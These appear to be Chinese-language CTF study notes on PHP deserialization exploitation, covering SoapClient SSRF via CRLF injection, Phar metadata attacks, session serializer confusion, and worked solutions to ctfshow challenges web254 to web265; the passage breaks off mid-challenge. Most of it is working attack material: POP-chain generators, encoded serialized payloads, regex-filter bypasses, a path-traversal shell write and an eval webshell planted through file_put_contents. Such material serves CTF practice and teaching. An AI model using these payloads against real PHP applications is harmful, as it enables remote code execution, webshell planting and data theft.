$_SERVER[‘HTTP_X_FORWARDED_FOR’]会获取我们的XFF头的信息

并要求是127.0.0.1，token为ctfshow

poc：

```php
<?php
$target = 'http://127.0.0.1/flag.php';
$post_string = 'token=ctfshow';
$b = new SoapClient(null,array('location' => $target,'user_agent'=>'wupco^^X-Forwarded-For:127.0.0.1,127.0.0.1^^Content-Type: application/x-www-form-urlencoded'.'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri'=> "ssrf"));
$a = serialize($b);
$a = str_replace('^^',"\r\n",$a);
echo urlencode($a);
?>
```

传参即可

### 5.获取注释内容

这是2021年国赛的时候，遇到的一个题目，也是我唯一做出来的题目….呜呜呜

**[ReflectionMethod](https://www.php.net/manual/zh/class.reflectionmethod.php)**

(PHP 5 >= 5.1.0, PHP 7, PHP 8)

ReflectionFunctionAbstract::getDocComment — 获取注释内容
由该原生类中的getDocComment方法可以访问到注释的内容

**本人没有在网上找到环境，就用源码自己改了一下注释和flag**

源码：

```php
<?php
highlight_file(__file__);
class User
{
    private static $c = 0;

    function a()
    {
        return ++self::$c;
    }

    function b()
    {
        return ++self::$c;
    }

    function c()
    {
        return ++self::$c;
    }

    function d()
    {
        return ++self::$c;
    }

    function e()
    {
        /**
         * flag{asdgjfiokjFJI305-34525I47U-3SDFG}
         */
        return ++self::$c;
    }

    function f()
    {
        return ++self::$c;
    }

    function g()
    {
        return ++self::$c;
    }

    function h()
    {
        return ++self::$c;
    }

    function i()
    {
        return ++self::$c;
    }

    function j()
    {
        return ++self::$c;
    }

    function k()
    {
        return ++self::$c;
    }

    function l()
    {
        return ++self::$c;
    }

    function m()
    {
        return ++self::$c;
    }

    function n()
    {
        return ++self::$c;
    }

    function o()
    {
        return ++self::$c;
    }

    function p()
    {
        return ++self::$c;
    }

    function q()
    {
        return ++self::$c;
    }

    function r()
    {
        return ++self::$c;
    }

    function s()
    {
        return ++self::$c;
    }

    function t()
    {
        return ++self::$c;
    }

}

$rc=$_GET["rc"];
$rb=$_GET["rb"];
$ra=$_GET["ra"];
$rd=$_GET["rd"];
$method= new $rc($ra, $rb);
var_dump($method->$rd());
```

这里rc是传入原生类名，rb和ra都是传入类的属性，rd时传入类方法，后面就是实例化并且调用该方法。

payload：

```php
?rc=ReflectionMethod&ra=User&rb=a&rd=getDocComment
```

<img src="图片\t01be9035739587a99b.png" alt="img" style="zoom:80%;" />



## Y4tacker文章

[Y4tacker文章](https://blog.csdn.net/solitudi/article/details/113588692?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167550748316800225587282%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=167550748316800225587282&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-113588692-null-null.blog_rank_default&utm_term=%E5%8F%8D%E5%BA%8F%E5%88%97&spm=1018.2226.3001.4450)

### SoapClient介绍

 综述：

- [ ] php在安装php-soap拓展后，可以**反序列化原生类SoapClient，来发送http post请求**。

- [ ] 必须调用SoapClient不存在的方法，触发SoapClient的__call魔术方法。

- [ ] 通过CRLF来添加请求体：SoapClient可以指定请求的user-agent头，通过添加换行符的形式来加入其他请求内容

  

SoapClient采用了HTTP作为底层通讯协议，XML作为数据传送的格式，其采用了SOAP协议(SOAP 是一种简单的基于 XML 的协议,它使应用程序通过 HTTP 来交换信息)，其次我们知道某个实例化的类，如果去调用了一个不存在的函数，会去调用__call方法，具体详细的信息大家可以去搜索引擎看看，这里不再赘述

### 利用方式

下面首先在我的VPS上面开启监听`nc -lvvp 9328`

```php
<?php
$a = new SoapClient(null,array('uri'=>'bbb', 'location'=>'http://xxxx.xxx.xx:9328'));
$b = serialize($a);
$c = unserialize($b);
$c -> not_a_function();//调用不存在的方法，让SoapClient调用__call
```

运行上面的php程序，在我的vps上面奖会捕获监听

<img src="图片\Snipaste_2023-02-05_09-35-30.png" alt="Snipaste_2023-02-05_09-35-30" style="zoom:80%;" />

从上面这张图可以看到，`SOAPAction`处是我们的可控参数，因此我们可以尝试注入我们自己恶意构造的**CRLF**即插入**\r\n**，利用成功！

```
$a = new SoapClient(null,array('uri'=>'bbb\r\n\r\ntest\r\n', 'location'=>'http://43.142.255.132:9328'));
```

但是还有个问题我们再发送POST数据的时候是需要遵循HTTP协议，指定请求头Content-Type: application/x-www-form-urlencoded但Content-Type在SOAPAction的上面，就无法控制Content-Type,也就不能控制POST的数据

<img src="图片\20210203104940804.png" alt="20210203104940804" style="zoom:80%;" />

# Phar反序列化

## 前置

### **1.回顾一下原先 PHP 反序列化攻击的必要条件**

**(1)首先我们必须有 unserailize() 函数**
**(2)unserailize() 函数的参数必须可控**

这两个是原先存在 PHP 反序列化漏洞的必要条件，没有这两个条件你谈都不要谈，根本不可能，但是从2017 年开始 Orange 告诉我们是可以的

### **2.phar:// 如何扩展反序列化的攻击面的**

原来 phar 文件包在 生成时会以序列化的形式存储用户自定义的 meta-data ，配合 phar:// 我们就能在文件系统函数 file_exists() is_dir() 等参数可控的情况下实现自动的反序列化操作，于是我们就能通过**构造精心设计的 phar 包在没有 unserailize() 的情况下**实现反序列化攻击，从而将 PHP 反序列化漏洞的触发条件大大拓宽了，降低了我们 PHP 反序列化的攻击起点

### 3.Phar反序列化

phar文件本质上是一种**压缩文件**，会以序列化的形式存储用户自定义的meta-data。当**受影响的文件操作函数调用phar文件时**，会**自动反序列化meta-data内的内容**

### 4.什么是phar文件

在软件中，PHAR（PHP归档）文件是一种打包格式，通过将许多PHP代码文件和其他资源（例如图像，样式表等）捆绑到一个归档文件中来实现应用程序和库的分发

php通过用户定义和内置的“流包装器”实现复杂的文件处理功能。内置包装器可用于文件系统函数，如(fopen(),copy(),file_exists()和filesize()。 phar://就是一种内置的流包装器。

php中一些常见的流包装器如下：

```
file:// — 访问本地文件系统，在用文件系统函数时默认就使用该包装器
http:// — 访问 HTTP(s) 网址
ftp:// — 访问 FTP(s) URLs
php:// — 访问各个输入/输出流（I/O streams）
zlib:// — 压缩流
data:// — 数据（RFC 2397）
glob:// — 查找匹配的文件路径模式
phar:// — PHP 归档
ssh2:// — Secure Shell 2
rar:// — RAR
ogg:// — 音频流
expect:// — 处理交互式的流
```

### 5.phar文件的结构

```
stub:phar文件的标志，必须以 xxx __HALT_COMPILER();?> 结尾，否则无法识别。xxx可以为自定义内容。
manifest:phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是漏洞利用最核心的地方。
content:被压缩文件的内容
signature (可空):签名，放在末尾。
```

### 6.如何生成一个phar文件？

```php
<?php
class User{
    var $name;
}

$phar = new Phar("test.phar");  //后缀名必须为phar
$phar->startBuffering();
$phar->setStub("GIF89a<?php __HALT_COMPILER(); ?>");  ////设置stub 文件头可以添加GIF89a
$o = new User();
$o->name = "phpinfo();";
$phar->setMetadata($o);    //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test");   //添加到压缩的文件
$phar->stopBuffering();
```

### 7.漏洞利用条件

1. phar文件要能够上传到服务器端。
2. 要有可用的魔术方法作为“跳板”。
3. 文件操作函数的参数可控，且`:`、`/`、`phar`等特殊字符没有被过滤

### 8.受影响的函数

大部分文件操作函数

<img src="图片\20210203104957480.png" alt="20210203104957480" style="zoom:80%;" />

可能会影响更多，里面有详细说明https://blog.zsxsoft.com/post/38

```
//exif
exif_thumbnail
exif_imagetype
    
//gd
imageloadfont
imagecreatefrom***系列函数
    
//hash
    
hash_hmac_file
hash_file
hash_update_file
md5_file
sha1_file
    
// file/url
get_meta_tags
get_headers
    
//standard 
getimagesize
getimagesizefromstring
    
// zip   
$zip = new ZipArchive();
$res = $zip->open('c.zip');
$zip->extractTo('phar://test.phar/test');
// Bzip / Gzip 当环境限制了phar不能出现在前面的字符里。可以使用compress.bzip2://和compress.zlib://绕过
$z = 'compress.bzip2://phar:///home/sx/test.phar/test.txt';
$z = 'compress.zlib://phar:///home/sx/test.phar/test.txt';

//配合其他协议：(SUCTF)
//https://www.xctf.org.cn/library/details/17e9b70557d94b168c3e5d1e7d4ce78f475de26d/
//当环境限制了phar不能出现在前面的字符里，还可以配合其他协议进行利用。
//php://filter/read=convert.base64-encode/resource=phar://phar.phar

//Postgres pgsqlCopyToFile和pg_trace同样也是能使用的，需要开启phar的写功能。
<?php
	$pdo = new PDO(sprintf("pgsql:host=%s;dbname=%s;user=%s;password=%s", "127.0.0.1", "postgres", "sx", "123456"));
	@$pdo->pgsqlCopyFromFile('aa', 'phar://phar.phar/aa');
?>
    
// Mysql
//LOAD DATA LOCAL INFILE也会触发这个php_stream_open_wrapper
//配置一下mysqld:
//[mysqld]
//local-infile=1
//secure_file_priv=""
    
<?php
class A {
    public $s = '';
    public function __wakeup () {
        system($this->s);
    }
}
$m = mysqli_init();
mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true);
$s = mysqli_real_connect($m, 'localhost', 'root', 'root', 'testtable', 3306);
$p = mysqli_query($m, 'LOAD DATA LOCAL INFILE \'phar://test.phar/test\' INTO TABLE a  LINES TERMINATED BY \'\r\n\'  IGNORE 1 LINES;');
?>
```

### 9.绕过方式

当环境限制了phar不能出现在前面的字符里。可以使用compress.bzip2://和compress.zlib://等绕过

```
compress.bzip:    //phar:///test.phar/test.txt
compress.bzip2:   //phar:///test.phar/test.txt
compress.zlib:    //phar:///home/sx/test.phar/test.txt
php:              //filter/resource=phar:///test.phar/test.txt
```

当环境限制了phar不能出现在前面的字符里，还可以配合其他协议进行利用。

```
php://filter/read=convert.base64-encode/resource=phar://phar.phar
```

GIF格式验证可以通过在文件头部添加GIF89a绕过

```
1、$phar->setStub(“GIF89a”.“<?php __HALT_COMPILER(); ?>”); //设置stub
2、生成一个phar.phar，修改后缀名为phar.gif
```

## 例子

题目

```php
<?php 
class User {
     var $name;
     function __wakeup(){
         @eval($this->name);
     }
     // function __destruct(){
     //     echo $this->name;
     // }
 }
 $filename = $_GET['filename'];
 file_exists($filename);
```

生成 phar 文件，写入恶意 payload

```php
<?php
class User{
    var $name;
}

$phar = new Phar("test01.phar");
$phar->startBuffering();
$phar->setStub("GIF89a<?php __HALT_COMPILER(); ?>");  // 文件头添加GIF89a
$o = new User();
$o->name = "phpinfo();";
$phar->setMetadata($o);
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();
```

<img src="图片\Snipaste_2023-02-05_10-19-58.png" alt="Snipaste_2023-02-05_10-19-58" style="zoom:67%;" />

把 test01.phar 文件想办法上传到服务器web目录，再触发

```
http://127.0.0.1:8081/security/unserial/phar.php/?filename=phar://test01.phar/test.txt
```

<img src="图片\Snipaste_2023-02-05_10-23-10.png" alt="Snipaste_2023-02-05_10-23-10" style="zoom: 67%;" />

**另外**，可修改后缀 gif，我们触发这个地址也能触发代码执行

```
http://127.0.0.1:8081/security/unserial/phar.php/?filename=phar://test.gif/
```

<img src="图片\Snipaste_2023-02-06_17-03-01.png" alt="Snipaste_2023-02-06_17-03-01" style="zoom:80%;" />

看看 test.gif 吧

<img src="图片\Snipaste_2023-02-06_17-04-44.png" alt="Snipaste_2023-02-06_17-04-44" style="zoom:80%;" />

这下一目了然，test.gif 里有我们序列化好的恶意 payload

```
O:4:"User":1:{s:4:"name";s:10:"phpinfo();";}
```

# php-session反序列化

### session简单介绍

在计算机中，尤其是在网络应用中，称为“会话控制”。Session 对象存储特定用户会话所需的属性及配置信息。这样，当用户在应用程序的 Web 页之间跳转时，存储在 Session 对象中的变量将不会丢失，而是在整个用户会话中一直存在下去。**当用户请求来自应用程序的 Web 页时，如果该用户还没有会话，则 Web 服务器将自动创建一个 Session 对象。当会话过期或被放弃后，服务器将终止该会话**

当第一次访问网站时，Seesion_start()函数就会创建一个唯一的Session ID，并自动通过HTTP的响应头，将这个Session ID保存到客户端Cookie中。同时，**也在服务器端创建一个以Session ID命名的文件**，用于保存这个用户的会话信息。当同一个用户再次访问这个网站时，也会自动通过HTTP的请求头将Cookie中保存的Seesion ID再携带过来，这时Session_start()函数就不会再去分配一个新的Session ID，而是在服务器的硬盘中去寻找和这个Session ID同名的Session文件，将这之前为这个用户保存的会话信息读出，在当前脚本中应用，达到跟踪这个用户的目的

### session 的存储机制

php中的session中的内容并不是放在内存中的，而是以文件的方式来存储的，存储方式就是由配置项session.save_handler来进行确定的，默认是以文件的方式存储。
存储的文件是以sess_sessionid来进行命名的

| php_serialize | 经过serialize()函数序列化数组                            |
| ------------- | -------------------------------------------------------- |
| php           | 键名+竖线+经过serialize()函数处理的值                    |
| php_binary    | 键名的长度对应的ascii字符+键名+serialize()函数序列化的值 |


php.ini中一些session配置

```
session.save_path=“”         --设置session的存储路径
session.save_handler=“”      –设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)
session.auto_start boolen    –指定会话模块是否在请求开始时启动一个会话默认为0不启动
session.serialize_handler string  –定义用来序列化/反序列化的处理器名字。默认使用php
```

### 利用姿势

session.upload_progress进行文件包含和反序列化渗透
这篇文章说的很详细了，没必要班门弄斧   https://www.freebuf.com/vuls/202819.html

使用不同的引擎来处理session文件

**$_SESSION变量直接可控**
php 引擎的存储格式是`键名|serialized_string`，而 php_serialize 引擎的存储格式是 `serialized_string` 。如果程序使用两个引擎来分别处理的话就会出现问题

**如果在PHP在反序列化存储的$_SESSION数据时使用的引擎和序列化使用的引擎不一样，会导致数据无法正确第反序列化。通过精心构造的数据包，就可以绕过程序的验证或者是执行一些系统的方法**

来看看这两个php

```php
// 1.php
<?php
ini_set('session.serialize_handler', 'php_serialize');
session_start();
$_SESSION['y4'] = $_GET['a'];
var_dump($_SESSION);

//2.php
<?php
ini_set('session.serialize_handler', 'php');
session_start();
class test{
    public $name;
    function __wakeup(){
        echo $this->name;
    }
}
```

首先访问1.php，传入参数`a=|O:4:"test":1:{s:4:"name";s:8:"y4tacker";}`再访问2.php，注意不要忘记`|`

<img src="图片\Snipaste_2023-02-05_10-44-41.png" alt="Snipaste_2023-02-05_10-44-41" style="zoom:67%;" />

由于`1.php`是使用`php_serialize`引擎处理，因此只会把`'|'`当做一个正常的字符。然后访问`2.php`，由于用的是`php`引擎，因此遇到`'|'`时会将之看做键名与值的分割符，从而造成了歧义，导致其在解析session文件时直接对`'|'`后的值进行反序列化处理

这里可能会有一个小疑问，为什么在解析session文件时直接对`'|'`后的值进行反序列化处理，这也是处理器的功能？这个其实是因为`session_start()`这个函数，可以看下官方说明：

```
当会话自动开始或者通过 session_start() 手动开始的时候， PHP 内部会调用会话管理器的 open 和 read 回调函数。 会话管理器可能是 PHP 默认的， 也可能是扩展提供的（SQLite 或者 Memcached 扩展）， 也可能是通过 session_set_save_handler() 设定的用户自定义会话管理器。 通过 read 回调函数返回的现有会话数据（使用特殊的序列化格式存储），PHP 会自动反序列化数据并且填充 $_SESSION 超级全局变量
```

因此我们成功触发了`test`类中的`__wakeup()`方法,所以这种攻击思路是可行的。但这种方法是在可以对`session`的进行赋值的，那如果代码中不存在对`$_SESSION`变量赋值的情况下又该如何利用？

**$_SESSION变量直接不可控**

我们来看高校战疫的一道CTF题目

```php
<?php
//A webshell is wait for you
ini_set('session.serialize_handler', 'php');
session_start();
class OowoO
{
    public $mdzz;
    function __construct()
    {
        $this->mdzz = 'phpinfo();';
    }
    
    function __destruct()
    {
        eval($this->mdzz);
    }
}
if(isset($_GET['phpinfo']))
{
    $m = new OowoO();
}
else
{
    highlight_string(file_get_contents('index.php'));
}
?>
```

我们注意到这样一句话`ini_set('session.serialize_handler', 'php');`，因此不难猜测本身在`php.ini`当中的设置可能是`php_serialize`，在查看了`phpinfo`后得证猜测正确，也知道了这道题的考点

那么我们就进入phpinfo查看一下，`enabled=on`表示upload_progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；只需往该地址任意 POST 一个名为 `PHP_SESSION_UPLOAD_PROGRESS` 的字段，就可以将 filename 的值赋值到 session 中

<img src="图片\Snipaste_2023-02-05_10-52-40.png" alt="Snipaste_2023-02-05_10-52-40" style="zoom:80%;" />

构造文件上传的表单

```html
<form action="http://web.jarvisoj.com:32784/index.php" method="POST" enctype="multipart/form-data">
    <input type="hidden" name="777" />
    <input type="file" name="file" />
    <input type="submit" />
</form>
```

接下来构造序列化payload

```php
<?php
ini_set('session.serialize_handler', 'php_serialize');
session_start();
class OowoO
{
    public $mdzz='print_r(scandir(dirname(__FILE__)));';
}
$obj = new OowoO();
echo serialize($obj);
?>
```

由于采用Burp发包，为防止双引号被转义，在双引号前加上`\`，除此之外还要加上`|`

在这个页面随便上传一个文件，然后抓包修改`filename`的值

<img src="图片\20210203105041160.png" alt="20210203105041160" style="zoom:80%;" />

可以看到`Here_1s_7he_fl4g_buT_You_Cannot_see.php`这个文件，flag肯定在里面，但还有一个问题就是不知道这个路径，路径的问题就需要回到phpinfo页面去查看

<img src="图片\20210203105048835.png" alt="20210203105048835" style="zoom:80%;" />

因此我们只需要把payload，当中改为`print_r(file_get_contents("/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php"));`即可获取flag

```php
<?php
ini_set('session.serialize_handler', 'php_serialize');
session_start();
class OowoO
{
    public $mdzz='print_r(file_get_contents("/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php"));';
}
$obj = new OowoO();
echo serialize($obj);
?>
```

# ctfshow

## web254

```php
 <?php

error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;

    public function checkVip(){
        return $this->isVip;
    }
    public function login($u,$p){
        if($this->username===$u&&$this->password===$p){  //当?username=xxxxxx&password=xxxxxx时
            $this->isVip=true;   // $this->isVip=true 时便可看到flag
        }
        return $this->isVip;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){   // $this->isVip=true 时便可看到flag
            global $flag;
            echo "your flag is ".$flag;  
        }else{
            echo "no vip, no flag";
        }
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = new ctfShowUser();
    if($user->login($username,$password)){
        if($user->checkVip()){
            $user->vipOneKeyGetFlag();
        }
    }else{
        echo "no vip,no flag";
    }
}
```

```
?username=xxxxxx&password=xxxxxx
```

## web255

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-02 17:44:47
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-02 19:29:02
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;

    public function checkVip(){
        return $this->isVip;
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){    //这题没有让 $isVip 置为 true 的代码，需要我们序列化后修改
            global $flag;
            echo "your flag is ".$flag;
        }else{
            echo "no vip, no flag";
        }
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = unserialize($_COOKIE['user']);    //起点
    if($user->login($username,$password)){
        if($user->checkVip())
            $user->vipOneKeyGetFlag();
        }
    }else{
        echo "no vip,no flag";
    }
}
```

POP链

```php
<?php
class ctfShowUser
{
    public $username = 'xxxxxx';
    public $password = 'xxxxxx';
    public $isVip = true;
}
echo urlencode(serialize(new ctfShowUser()));
```

GET：

```
?username=xxxxxx&password=xxxxxx
```

COOKIE：

```
user=O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D
```

## web256

```php
<?php

error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

class ctfShowUser{
    public $username='xxxxxx';  //这里把 $username 和 $password 写死了
    public $password='xxxxxx';
    public $isVip=false;

    public function checkVip(){
        return $this->isVip;
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){
            global $flag;
            //细节在这里，要求 username与password不一样，反序列化修改属性即可
            if($this->username!==$this->password){  
                    echo "your flag is ".$flag;
              }
        }else{
            echo "no vip, no flag";
        }
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = unserialize($_COOKIE['user']);    //起点
    if($user->login($username,$password)){
        if($user->checkVip()){
            $user->vipOneKeyGetFlag();
        }
    }else{
        echo "no vip,no flag";
    }
}
```

```php
<?php
class ctfShowUser
{
    public $username = 'cnm';
    public $password = 'fuck';
    public $isVip = true;
}
echo urlencode(serialize(new ctfShowUser()));
```

GET:

```
?username=cnm&password=fuck
```

COOKIE:

```
user=O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A3%3A%22cnm%22%3Bs%3A8%3A%22password%22%3Bs%3A4%3A%22fuck%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D
```

## web258

```php
<?php
error_reporting(0);
highlight_file(__FILE__);

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false; // 改为true
    public $class = 'info';  

    public function __construct(){
    //把下面这里改成 new backDoor() ，方便调用destruct()方法下的getInfo()，调用的就是backDoor类下的etInfo()里的eval()
        $this->class=new info();
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function __destruct(){
        $this->class->getInfo();
    }
}

class info{
    public $user='xxxxxx';
    public function getInfo(){
        return $this->user;
    }
}

class backDoor{
    public $code;  //写入后门代码 system('cat flag.php');
    public function getInfo(){
        eval($this->code);   //终点
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    if(!preg_match('/[oc]:\d+:/i', $_COOKIE['user'])){
        $user = unserialize($_COOKIE['user']); // 起点
    }
    $user->login($username,$password);
}
```

```php
class ctfShowUser{
    public $class = 'info';
    public function __construct(){
        $this->class=new backDoor();
    }
}
class backDoor{
    public $code="system('cat flag.php');";
    public function getInfo(){
        eval($this->code);
    }
}
$a =serialize(new ctfShowUser());
//echo $a."<br>";
$a=str_replace(':11',':+11',$a);
$a=str_replace(':8',':+8',$a);  //绕过preg_match(’/[oc]:\d+:/i’, $var),使用➕
echo $a."<br>";
echo urlencode($a);
```

序列化后的数据

```
O:+11:"ctfShowUser":1:{s:5:"class";O:+8:"backDoor":1:{s:4:"code";s:23:"system('cat flag.php');";}}
O%3A%2B11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A23%3A%22system%28%27cat+flag.php%27%29%3B%22%3B%7D%7D
```

GET：

```
?username=xxxxxx&password=xxxxxx
```

COOKIE：

```
user=O%3A%2B11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A23%3A%22system%28%27cat+flag.php%27%29%3B%22%3B%7D%7D
```

## web259

https://y4tacker.blog.csdn.net/article/details/110521104

前置知识：

**CRLF注入攻击**
CRLF是“回车+换行”（\r\n）的简称，其十六进制编码分别为0x0d和0x0a。在HTTP协议中，HTTP header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP内容并显示出来。所以，一旦我们能够控制HTTP消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码。CRLF漏洞常出现在Location与Set-cookie消息头中

[简明理解CRLF攻击](https://www.baidu.com/link?url=frWA5r_dswC2XIM7AURlU8PQyVOwZT2CV9jhvIpV3AzMG3n22WLJaJOU5E-3goUxWtppfs0LwhOIIm6bz6G9zuJXslvADwMk-XCOFH_bQlW&wd=&eqid=8d8217980013433e000000045fc873c4)

**题目首页**

```php
<?php
highlight_file(__FILE__);

$vip = unserialize($_GET['vip']);
//vip can get flag one key
$vip->getFlag();
```

告诉我们 flag.php 的源码

```php
$xff = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
array_pop($xff);
$ip = array_pop($xff);


if($ip!=='127.0.0.1'){
	die('error');
}else{
	$token = $_POST['token'];
	if($token=='ctfshow'){
		file_put_contents('flag.txt',$flag);
	}
}
```

本题需要重点关注的[析构函数](https://so.csdn.net/so/search?q=析构函数&spm=1001.2101.3001.7020)

`__call` 在对象中调用一个不可访问方法时调用
在这道题中`$vip->getFlag();`因为调用了类中没有的方法所以会导致`__call`的执行
本题需要用到的函数

```
SoapClient::__call  //https://www.php.net/manual/zh/soapclient.call.php
```

因此我们只需要把XFF头改为127.0.0.1并以post方式传入token即可
给出payload
🐻：(注意flag.php当中x-f-f头加了以后X-Forwarded-For: 127.0.0.1,49.235.148.38, 172.69.35.19 pop方法弹出两个始终是49开头那个，所以我们把url改为127.0.0.1配合绕过)，发现不需要XFF头其实下面headers完全可以不要

```php
<?php
$target = 'http://127.0.0.1/flag.php';
$post_string = 'token=ctfshow';
$headers = array(
    'X-Forwarded-For: 127.0.0.1,127.0.0.1,127.0.0.1,127.0.0.1,127.0.0.1',
    'UM_distinctid:175648cc09a7ae-050bc162c95347-32667006-13c680-175648cc09b69d'
);
$b = new SoapClient(null,array('location' => $target,'user_agent'=>'y4tacker^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri' => "aaab"));

$aaa = serialize($b);
$aaa = str_replace('^^',"\r\n",$aaa);
$aaa = str_replace('&','&',$aaa);
echo urlencode($aaa);
```

总结

-不存在的方法触发__call

-无代码通过原生类SoapClient

-SoapClient使用查询编写利用

-通过访问本地Flag.php获取Flag

## web260

```php
<?php

error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

if(preg_match('/ctfshow_i_love_36D/',serialize($_GET['ctfshow']))){
    echo $flag;
}
```

序列化字符串

```php
<?php
$s = '/ctfshow_i_love_36D/';
echo urlencode(serialize($s));
```

```
?ctfshow=s%3A20%3A"%2Fctfshow_i_love_36D%2F"%3B
```

## web261

```php
<?php

highlight_file(__FILE__);

class ctfshowvip{
    public $username;
    public $password;
    public $code;

    public function __construct($u,$p){
        $this->username=$u;
        $this->password=$p;
    }
    public function __wakeup(){
        if($this->username!='' || $this->password!=''){
            die('error');
        }
    }
    public function __invoke(){
        eval($this->code);
    }

    public function __sleep(){
        $this->username='';
        $this->password='';
    }
    public function __unserialize($data){
        $this->username=$data['username'];
        $this->password=$data['password'];
        $this->code = $this->username.$this->password;
    }
    public function __destruct(){
        if($this->code==0x36d){
            file_put_contents($this->username, $this->password); //终点，写 shell
        }
    }
}

unserialize($_GET['vip']);
```

```php
<?php
echo 0x36D=="877x.php"
echo "<br>";    
class ctfshowvip{
    public $username;
    public $password;
    public function __construct($u,$p){
        $this->username=$u;
        $this->password=$p;
    }
}
echo urlencode(serialize(new ctfshowvip('877x.php','<?php @eval($_POST[gsl]);?>')));
```

```
1
O%3A10%3A%22ctfshowvip%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A8%3A%22877x.php%22%3Bs%3A8%3A%22password%22%3Bs%3A27%3A%22%3C%3Fphp+%40eval%28%24_POST%5Bgsl%5D%29%3B%3F%3E%22%3B%7D
```

## web262

```php
<?php

error_reporting(0);
class message{
    public $from;
    public $msg;
    public $to;
    public $token='user';
    public function __construct($f,$m,$t){
        $this->from = $f;
        $this->msg = $m;
        $this->to = $t;
    }
}

$f = $_GET['f'];
$m = $_GET['m'];
$t = $_GET['t'];

if(isset($f) && isset($m) && isset($t)){
    $msg = new message($f,$m,$t);
    $umsg = str_replace('fuck', 'loveU', serialize($msg));
    setcookie('msg',base64_encode($umsg));
    echo 'Your message has been sent';
}

highlight_file(__FILE__);
```

```php
<?php
class message{
    public $from;
    public $msg;
    public $to;
    public $token='admin';
    public function __construct($f,$m,$t){
        $this->from = $f;
        $this->msg = $m;
        $this->to = $t;
    }
}
echo serialize(new message('1','2','fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck'))."<br>";
echo base64_encode(serialize(new message('1','2','fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck')));
```

## web263

/www.zip为网站源码

利用exp

```php
<?php
class User{
    public $username="admin/../../../../../../../../../../var/www/html/1.php";
    public $password="<?php system('cat flag.php');?>";
    public $status;

}
$a = new User();
$c =  "|".serialize($a);
echo urlencode(base64_encode($c));
```

```
fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo1NDoiYWRtaW4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vdmFyL3d3dy9odG1sLzEucGhwIjtzOjg6InBhc3N3b3JkIjtzOjMxOiI8P3BocCBzeXN0ZW0oJ2NhdCBmbGFnLnBocCcpOz8%2BIjtzOjY6InN0YXR1cyI7Tjt9
```

之后大致说下解题步骤：
1.首先访问首页，获得 cookie，同时建立 session
2.抓包修改 cookie 为序列化字符串
3.访问 check.php，反序列化实现 shell 写入
4.访问1.php审查元素查看flag

## web265

```php
<?php

error_reporting(0);
include('flag.php');
highlight_file(__FILE__);
class ctfshowAdmin{
    public $token;
    public $password;

    public function __construct($t,$p){
        $this->token=$t;
        $this->password = $p;
    }
    public function login(){
        return $this->token===$this->password;
    }
}

$ctfshow = unserialize($_GET['ctfshow']);
